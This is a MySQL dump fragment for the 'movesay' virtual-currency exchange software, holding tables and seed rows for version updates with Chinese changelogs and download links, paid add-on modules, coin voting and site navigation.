INSERT INTO `movesay_version` VALUES ('2.3.7', '10015', '修复更新', '1466394377', '1466394471', '修复首页下拉导航条显示bug\r\n修复交易界面导航条下拉bug', 'http://101.201.199.224/Update/download/2.3.7.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.3.8', '10016', '更新权限', '1467096687', '1467096830', '更新权限部分（还未完善）', 'http://101.201.199.224/Update/download/2.3.8.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.3.9', '10017', '更新后台内容管理', '1467105573', '1467106204', '更新后台内容管理', 'http://101.201.199.224/Update/download/2.3.9.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.0', '10018', '更新后台用户管理部分', '1467111754', '1467111785', '更新后台用户管理部分', 'http://101.201.199.224/Update/download/2.4.0.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.1', '10019', '优化扩展功能', '1467119925', '1467119937', '优化扩展功能', 'http://101.201.199.224/Update/download/2.4.1.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.2', '10020', '优化后台用户编辑', '1467185261', '1467190442', '优化后台用户编辑', 'http://101.201.199.224/Update/download/2.4.2.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.3', '10021', '优化后台菜单部分', '1467265786', '1467266307', '优化后台菜单部分', 'http://101.201.199.224/Update/download/2.4.3.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.4', '10022', '更新后台交易管理部分', '1467266348', '1467266573', '更新后台交易管理部分', 'http://101.201.199.224/Update/download/2.4.4.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.5', '10023', '优化财务部分', '1467270688', '1467270736', '优化人民币充值 提现\r\n优化虚拟币转入 转出\r\n\r\n需要重新配置充值方式', 'http://101.201.199.224/Update/download/2.4.5.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.6', '10024', '优化财务部分', '1467346688', '1467354994', '优化充值提现转入转出', 'http://101.201.199.224/Update/download/2.4.6.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.7', '10025', '更新人民币充值功能', '1467352025', '1467355004', '更新人民币充值功能\r\n优化软件不能自动到账\r\n优化前台充值弹窗的状态', 'http://101.201.199.224/Update/download/2.4.7.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.8', '10026', '优化自动更新功能', '1467361623', '0', '优化自动更新功能', 'http://101.201.199.224/Update/download/2.4.8.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.9', '10027', '优化后台首页', '1467362093', '1467382933', '优化后台首页\r\n增加扩展 -客服代码  可以更换钱袋客服代码 \r\n更新之后，需要清理缓存', 'http://os.movesay.com/Auth/upFile/version/2.4.9', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.0', '10028', '优化所有后台功能', '1467601458', '1467699741', '优化所有后台功能但不包括应用部分\r\n在设置里面增加了导航设置可以控制前台导航了\r\n扩展里面增加客服代码可以更新客服代码了\r\n应用管理里面支持已经购买的 应用安装和卸载了\r\n增加有新的升级所有后台页面都会提示\r\n及时更新修复漏洞能使网站更安全\r\n更新人民币充值方式需要重新配置\r\n优化大部分后台授权可能有个别没有添加授权后期完善\r\n优化整个后台样式让您看着更舒服\r\n优化认购中心需要重新安装卸载如果提示没有授权请联系我们', 'http://os.movesay.com/Auth/upFile/version/2.5.0', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.1', '10029', '模板更新  更新之后在扩展里面主题设置一下 不然前台打不开不了', '1467685524', '1467713145', '支持客服代码定制\r\n扩展里面增加模板切换支持定制\r\n设置其他设置里面取消模板切换\r\n优化应用管理支持新应用预定\r\n优化用户管理搜索用户名不能用\r\n优化后台提现不能导出选中\r\n优化认购详情界面换成币种图标\r\n\r\n\r\n\r\n\r\n\r\n', 'http://os.movesay.com/Auth/upFile/version/2.5.1', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.2', '10030', '优化超级管理员功能', '1467714463', '1467714482', '优化只有超级管理员才能看到升级提示\r\n优化只有超级管理员才能升级系统\r\n优化只有超级管理员才能切换模板\r\n优化只有超级管理员才能切换客服代码\r\n', 'http://os.movesay.com/Auth/upFile/version/2.5.2', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.3', '10031', '更新底部和文章部分', '1467785561', '1467789262', '更新底部新样式\r\n更新文章部分具体效果可以看我们的演示网站\r\n优化首页文章部分\r\n优化交易中心拉100%不能交易\r\n优化后台撤销有时候会出现失败', 'http://os.movesay.com/Auth/upFile/version/2.5.3', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.4', '10032', '优化文章时间文字', '1467795268', '1467795306', '优化文章时间不能修改的问题', 'http://os.movesay.com/Auth/upFile/version/2.5.4', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.5', '10033', '优化后台核心', '1467856087', '1467856102', '优化后台核心', 'http://os.movesay.com/Auth/upFile/version/2.5.5', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.6', '10034', '升级系统文件部分过期的问题', '1469073091', '1469074318', '升级系统文件部分过期的问题', 'http://os.movesay.com/Auth/upFile/version/2.5.6', '0', '0');

-- ----------------------------
-- Table structure for `movesay_version_game`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_version_game`;
CREATE TABLE `movesay_version_game` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `gongsi` varchar(200) COLLATE utf8_unicode_ci NOT NULL COMMENT '名称',
  `shuoming` varchar(200) COLLATE utf8_unicode_ci NOT NULL COMMENT '名称',
  `class` varchar(200) COLLATE utf8_unicode_ci NOT NULL COMMENT '名称',
  `name` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `title` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `number` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci ROW_FORMAT=DYNAMIC COMMENT='应用管理表';

-- ----------------------------
-- Records of movesay_version_game
-- ----------------------------
INSERT INTO `movesay_version_game` VALUES ('1', '武汉动说科技有限公司', '支持虚拟币的购物商城', '#F1AB0F', 'shop', '云购商城', '1');
INSERT INTO `movesay_version_game` VALUES ('2', '武汉动说科技有限公司', '支持对用户进行持币比例分红', '#C53CE7', 'fenhong', '分红中心', '1');
INSERT INTO `movesay_version_game` VALUES ('3', '武汉动说科技有限公司', '支持用虚拟币充值手机话费', '#428bca', 'huafei', '话费充值', '1');
INSERT INTO `movesay_version_game` VALUES ('4', '武汉动说科技有限公司', '可以发行虚拟币让用户认购', '#e74c3c', 'issue', '认购中心', '1');
INSERT INTO `movesay_version_game` VALUES ('5', '武汉动说科技有限公司', '可以对要生效的新币进行投票', '#1abc9c', 'vote', '新币投票', '1');
INSERT INTO `movesay_version_game` VALUES ('6', '武汉动说科技有限公司', '存币涨利息类型于存在钱到银行涨利息', '#f1c40f', 'money', '理财中心', '1');
INSERT INTO `movesay_version_game` VALUES ('7', '武汉动说科技有限公司', '支持单对单交易', '#3c763d', 'bazaar', '集市交易', '0');
INSERT INTO `movesay_version_game` VALUES ('8', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'pool', '矿机工厂', '0');
INSERT INTO `movesay_version_game` VALUES ('9', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'crowd', '众筹中心', '0');
INSERT INTO `movesay_version_game` VALUES ('10', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'qiandao', '签到功能', '0');
INSERT INTO `movesay_version_game` VALUES ('11', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'hongbao', '人人红包', '0');
INSERT INTO `movesay_version_game` VALUES ('12', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'weike', '威客任务', '0');
INSERT INTO `movesay_version_game` VALUES ('13', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'duihuan', '币币兑换', '0');
INSERT INTO `movesay_version_game` VALUES ('14', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'shoujiang', '幸运抽奖', '0');
INSERT INTO `movesay_version_game` VALUES ('15', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'duobao', '一元夺宝', '0');

-- ----------------------------
-- Table structure for `movesay_vote`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_vote`;
CREATE TABLE `movesay_vote` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `type` int(20) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `type` (`type`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_vote
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_vote_type`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_vote_type`;
CREATE TABLE `movesay_vote_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_vote_type
-- ----------------------------

-- ----------------------------
-- Table structure for `qq3479015851_daohang`
-- ----------------------------
DROP TABLE IF EXISTS `qq3479015851_daohang`;
CREATE TABLE `qq3479015851_daohang` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL COMMENT '名称',
  `title` varchar(255) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT 'url',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=gbk;

-- ----------------------------
-- Records of qq3479015851_daohang
-- ----------------------------
INSERT INTO `qq3479015851_daohang` VALUES ('1', 'finance', '财务中心', 'Finance/index', '1', '0', '0', '1');
INSERT INTO `qq3479015851_daohang` VALUES ('2', 'user', '安全中心', 'User/index', '2', '0', '0', '1');
INSERT INTO `qq3479015851_daohang` VALUES ('3', 'game', '应用中心', 'Game/index', '3', '0', '0', '1');
INSERT INTO `qq3479015851_daohang` VALUES ('4', 'article', '帮助中心', 'Article/index', '4', '0', '0', '1');
